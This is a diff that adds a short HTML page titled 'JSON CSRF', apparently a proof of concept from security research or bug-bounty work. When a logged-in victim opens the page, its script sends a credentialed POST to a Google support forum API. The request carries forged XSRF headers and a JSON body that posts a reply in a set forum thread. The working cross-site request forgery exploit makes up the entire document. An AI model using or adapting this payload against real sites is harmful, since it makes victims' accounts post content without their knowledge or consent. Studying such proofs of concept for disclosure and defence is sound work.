@@ -1,0 +1,19 @@
+
+
+<html>
+<title>JSON CSRF</title>
+<body>
+<center>
+<h1> JSON CSRF </h1>
+<script>
+fetch('https://support.google.com/wearos/apis/forum?v=1&hl=en&key=support-content&request_source=1&service_configuration=&mendel_ids=10800170,10800177,10800235,10800245,10800247,10800112', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain', 'X-SupportContent-AllowApiCookieAuth': true, 'X-SupportContent-XsrfToken': 'csrf'}, body: '{"resource":{"create_message":{"thread_id":7553185,"payload":"csrf from fetch","upload":[],"subscribe":false,"type":"REPLY","check_pii":true,"profile_exists":true}},"common_params":{"context_params":{"view_id":1699718703}}}'});
+</script>
+<form action="#">
+<input type="button" value="Submit" />
+</form>
+</center>
+</body>
+</html>
+
+
+
